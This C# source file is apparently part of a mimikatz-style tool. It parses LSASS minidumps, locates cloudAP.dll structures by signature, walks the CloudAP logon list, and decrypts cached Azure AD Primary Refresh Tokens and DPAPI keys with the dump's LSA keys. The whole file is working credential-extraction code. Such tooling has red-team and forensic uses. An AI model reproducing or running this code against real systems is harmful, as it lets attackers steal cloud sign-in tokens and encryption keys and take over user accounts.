using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using MiniDumpModule.Crypto;
using MiniDumpModule.Invocation.Data;
using MiniDumpModule.Templates;
using static MiniDumpModule.Helpers;

namespace MiniDumpModule.Decryptor
{
    public class Cloudap_
    {
        public static int FindCredentials(MiniDump minidump, cloudap.CloudapTemplate template)
        {
            wdigest.KIWI_WDIGEST_LIST_ENTRY entry;
            long logSessListAddr;
            long llCurrent;

            var position = find_signature(minidump, "cloudAP.dll", template.signature);
            if (position == 0)
                return 0;

            var ptr_entry_loc = get_ptr_with_offset(minidump.BinaryReader, (position + template.first_entry_offset), minidump.SystemInfo);
            var ptr_entry = ReadUInt64(minidump.BinaryReader, (long)ptr_entry_loc);

            llCurrent = (long)ptr_entry;
            var stop = ReadInt64(minidump.BinaryReader, Rva2offset(minidump, llCurrent + 8));

            do
            {
                logSessListAddr = Rva2offset(minidump, llCurrent);
                var Bytes = ReadBytes(minidump.BinaryReader, logSessListAddr, Marshal.SizeOf(typeof(KIWI_CLOUDAP_LOGON_LIST_ENTRY)));
                var log = ReadStruct<KIWI_CLOUDAP_LOGON_LIST_ENTRY>(Bytes);
                var luid = log.LocallyUniqueIdentifier;
                //PrintProperties(log);

                var entryBytes = ReadBytes(minidump.BinaryReader, Rva2offset(minidump, log.cacheEntry), Marshal.SizeOf(typeof(KIWI_CLOUDAP_CACHE_LIST_ENTRY)));
                var cacheEntry = ReadStruct<KIWI_CLOUDAP_CACHE_LIST_ENTRY>(entryBytes);
                var cachedir = Encoding.Unicode.GetString(cacheEntry.toname);
                //PrintProperties(cacheEntry);

                var cloudapentry = new Cloudap();
                cloudapentry.cachedir = cachedir;

                if (cacheEntry.cbPRT != 0 && cacheEntry.PRT != 0)
                {
                    var prtBytes = ReadBytes(minidump.BinaryReader, Rva2offset(minidump, (long)cacheEntry.PRT), (int)cacheEntry.cbPRT);
                    var DecryptedPRTBytes = BCrypt.DecryptCredentials(prtBytes, minidump.LsaKeys);
                    var PRT = Encoding.ASCII.GetString(DecryptedPRTBytes.Skip(25).ToArray());
                    cloudapentry.PRT = PRT;


                    if (cacheEntry.toDetermine != 0)
                    {
                        var cacheunkBytes = ReadBytes(minidump.BinaryReader, Rva2offset(minidump, (long)cacheEntry.toDetermine), Marshal.SizeOf(typeof(KIWI_CLOUDAP_CACHE_UNK)));
                        var cacheunk = ReadStruct<KIWI_CLOUDAP_CACHE_UNK>(cacheunkBytes);
                        var DecryptedDpapiBytes = BCrypt.DecryptCredentials(cacheunk.unk, minidump.LsaKeys);

                        var key_guid = cacheunk.guid.ToString();
                        var dpapi_key = BitConverter.ToString(DecryptedDpapiBytes).Replace("-", "");
                        var dpapi_key_sha1 = BCrypt.GetHashSHA1(DecryptedDpapiBytes);

                        cloudapentry.key_guid = key_guid;
                        cloudapentry.dpapi_key = dpapi_key;
                        cloudapentry.dpapi_key_sha = dpapi_key_sha1;
                    }

                    var currentlogon = minidump.LogonList.FirstOrDefault(x => x.LogonId.HighPart == luid.HighPart && x.LogonId.LowPart == luid.LowPart);
                    if (currentlogon == null)
                    {
                        currentlogon = new Logon(luid)
                        {
                            //UserName = username,
                            Cloudap = new List<Cloudap>()
                        };
                        currentlogon.Cloudap.Add(cloudapentry);
                        minidump.LogonList.Add(currentlogon);
                        //continue;
                    }
                    else
                    {
                        currentlogon.Cloudap = new List<Cloudap>();
                        currentlogon.Cloudap.Add(cloudapentry);
                    }
                }

                llCurrent = log.Flink;
            } while (llCurrent != stop);

            return 0;
        }
    }
}